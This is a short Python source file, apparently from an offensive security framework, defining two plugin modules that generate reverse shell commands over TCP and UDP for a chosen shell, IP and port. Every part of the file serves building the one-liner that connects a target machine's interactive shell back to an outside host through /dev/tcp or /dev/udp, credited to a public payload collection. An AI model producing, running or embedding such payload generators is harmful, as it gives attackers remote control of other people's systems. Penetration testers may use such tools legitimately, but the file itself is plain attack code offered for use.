from ogabog.cores import plugin


class ReverseShell(plugin.Module):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--shell",
            default="bash",
            choices=[
                'bash',
                'dash',
                'sh',
                'ash',
                'bsh',
                'csh',
                'ksh',
                'zsh',
                'pdksh',
                'tcsh'
            ],
            help="Select shell type on target machine"
        )
        self.add_args(
            "--ip",
            help="IP address",
            required=True
        )
        self.add_args(
            "--port",
            help="Port address",
            required=True
        )
        self.opts.description = "[ReverseShell][TCP] Generic shells from swisskyrepo/PayloadsAllTheThings. License MIT."

    def make_shell(self):
        self.shell = "{} -i >& /dev/tcp/{}/{} 0>&1".format(self.args.shell, self.args.ip, self.args.port)


class ReverseShellUDP(plugin.Module):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--shell",
            default="bash",
            choices=[
                'bash',
                'dash',
                'sh',
                'ash',
                'bsh',
                'csh',
                'ksh',
                'zsh',
                'pdksh',
                'tcsh'
            ],
            help="Select shell type on target machine"
        )
        self.add_args(
            "--ip",
            help="IP address",
            required=True
        )
        self.add_args(
            "--port",
            help="Port address",
            required=True
        )
        self.opts.description = "[ReverseShell][UDP] Generic shells from swisskyrepo/PayloadsAllTheThings. License MIT."

    def make_shell(self):
        self.shell = "{} -i >& /dev/udp/{}/{} 0>&1".format(self.args.shell, self.args.ip, self.args.port)
